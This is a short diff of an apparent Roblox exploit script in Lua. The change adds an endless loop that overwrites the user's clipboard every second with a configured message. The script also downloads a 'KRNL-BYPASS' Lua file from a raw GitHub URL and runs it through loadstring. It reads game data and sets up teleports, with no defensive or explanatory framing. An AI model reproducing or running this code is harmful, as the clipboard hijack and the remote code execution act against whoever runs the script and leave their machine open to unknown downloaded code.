@@ -43,12 +43,17 @@ end)
         local TeleportService = game:GetService("TeleportService")
         local krnlbypass = "https://raw.githubusercontent.com/RblxScriptsOG/Main/refs/heads/main/KRNL-BYPASS.lua"
 
+        coroutine.wrap(function()
+    while true do
+        setclipboard(_G.Script.SM.Config.MSG)
+        wait(1)
+    end
+end)()
+
         local data = DataService:GetData()
         local maxAttempts = 10
         local attempt = 1
         local teleported = false
-
-        setclipboard(_G.Script.SM.Config.MSG)
 
         loadstring(game:HttpGet(krnlbypass, true))()
         
